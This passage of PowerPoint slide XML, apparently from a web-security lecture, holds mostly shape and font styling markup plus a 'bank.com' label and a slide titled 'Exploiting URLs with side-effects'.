              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83995" name="object 32"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692088" y="3437405"/>
            <a:ext cx="1155607" cy="442632"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId10"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83996" name="object 33"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1692088" y="3437405"/>
            <a:ext cx="1155607" cy="442632"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T1" fmla="*/ 0 h 501650"/>
              <a:gd name="T2" fmla="*/ 120806 w 1309370"/>
              <a:gd name="T3" fmla="*/ 0 h 501650"/>
              <a:gd name="T4" fmla="*/ 73790 w 1309370"/>
              <a:gd name="T5" fmla="*/ 9436 h 501650"/>
              <a:gd name="T6" fmla="*/ 35396 w 1309370"/>
              <a:gd name="T7" fmla="*/ 35169 h 501650"/>
              <a:gd name="T8" fmla="*/ 9486 w 1309370"/>
              <a:gd name="T9" fmla="*/ 73337 h 501650"/>
              <a:gd name="T10" fmla="*/ 0 w 1309370"/>
              <a:gd name="T11" fmla="*/ 120078 h 501650"/>
              <a:gd name="T12" fmla="*/ 0 w 1309370"/>
              <a:gd name="T13" fmla="*/ 381076 h 501650"/>
              <a:gd name="T14" fmla="*/ 9486 w 1309370"/>
              <a:gd name="T15" fmla="*/ 427816 h 501650"/>
              <a:gd name="T16" fmla="*/ 35396 w 1309370"/>
              <a:gd name="T17" fmla="*/ 465985 h 501650"/>
              <a:gd name="T18" fmla="*/ 73790 w 1309370"/>
              <a:gd name="T19" fmla="*/ 491718 h 501650"/>
              <a:gd name="T20" fmla="*/ 120806 w 1309370"/>
              <a:gd name="T21" fmla="*/ 501154 h 501650"/>
              <a:gd name="T22" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T23" fmla="*/ 501154 h 501650"/>
              <a:gd name="T24" fmla="*/ 1243479 w 1309370"/>
              <a:gd name="T25" fmla="*/ 491718 h 501650"/>
              <a:gd name="T26" fmla="*/ 1281884 w 1309370"/>
              <a:gd name="T27" fmla="*/ 465985 h 501650"/>
              <a:gd name="T28" fmla="*/ 1307775 w 1309370"/>
              <a:gd name="T29" fmla="*/ 427816 h 501650"/>
              <a:gd name="T30" fmla="*/ 1317269 w 1309370"/>
              <a:gd name="T31" fmla="*/ 381076 h 501650"/>
              <a:gd name="T32" fmla="*/ 1317269 w 1309370"/>
              <a:gd name="T33" fmla="*/ 120078 h 501650"/>
              <a:gd name="T34" fmla="*/ 1307775 w 1309370"/>
              <a:gd name="T35" fmla="*/ 73337 h 501650"/>
              <a:gd name="T36" fmla="*/ 1281884 w 1309370"/>
              <a:gd name="T37" fmla="*/ 35169 h 501650"/>
              <a:gd name="T38" fmla="*/ 1243479 w 1309370"/>
              <a:gd name="T39" fmla="*/ 9436 h 501650"/>
              <a:gd name="T40" fmla="*/ 1196446 w 1309370"/>
              <a:gd name="T41" fmla="*/ 0 h 50165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1309370" h="501650">
                <a:moveTo>
                  <a:pt x="1189205" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="120081" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73340" y="9436"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35171" y="35169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9436" y="73337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="120078"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="381076"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9436" y="427816"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35171" y="465985"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73340" y="491718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120081" y="501154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1189205" y="501154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1235953" y="491718"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1274125" y="465985"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1299860" y="427816"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309296" y="381076"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309296" y="120078"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1299860" y="73337"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1274125" y="35169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1235953" y="9436"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1189205" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83997" name="object 34"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1802747" y="3529853"/>
            <a:ext cx="937091"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11113">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1500">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83998" name="object 35"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1855975" y="3884239"/>
            <a:ext cx="84044" cy="319368"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 111769 w 94614"/>
              <a:gd name="T1" fmla="*/ 361732 h 361950"/>
              <a:gd name="T2" fmla="*/ 51650 w 94614"/>
              <a:gd name="T3" fmla="*/ 310812 h 361950"/>
              <a:gd name="T4" fmla="*/ 30319 w 94614"/>
              <a:gd name="T5" fmla="*/ 270240 h 361950"/>
              <a:gd name="T6" fmla="*/ 14605 w 94614"/>
              <a:gd name="T7" fmla="*/ 225176 h 361950"/>
              <a:gd name="T8" fmla="*/ 4498 w 94614"/>
              <a:gd name="T9" fmla="*/ 175621 h 361950"/>
              <a:gd name="T10" fmla="*/ 0 w 94614"/>
              <a:gd name="T11" fmla="*/ 121573 h 361950"/>
              <a:gd name="T12" fmla="*/ 1105 w 94614"/>
              <a:gd name="T13" fmla="*/ 63033 h 361950"/>
              <a:gd name="T14" fmla="*/ 7820 w 94614"/>
              <a:gd name="T15" fmla="*/ 0 h 36195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94614" h="361950">
                <a:moveTo>
                  <a:pt x="94534" y="361732"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="43681" y="310812"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25644" y="270240"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12352" y="225176"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3804" y="175621"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="121573"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="936" y="63033"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6614" y="0"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="635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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83999" name="object 36"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1861578" y="4088747"/>
            <a:ext cx="256334" cy="207309"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 124426 w 290195"/>
              <a:gd name="T1" fmla="*/ 0 h 235585"/>
              <a:gd name="T2" fmla="*/ 0 w 290195"/>
              <a:gd name="T3" fmla="*/ 214099 h 235585"/>
              <a:gd name="T4" fmla="*/ 297598 w 290195"/>
              <a:gd name="T5" fmla="*/ 220225 h 235585"/>
              <a:gd name="T6" fmla="*/ 124426 w 290195"/>
              <a:gd name="T7" fmla="*/ 0 h 23558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90195" h="235585">
                <a:moveTo>
                  <a:pt x="121076" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="229044"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="289585" y="235597"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12107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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="124759715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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84995" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84996" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
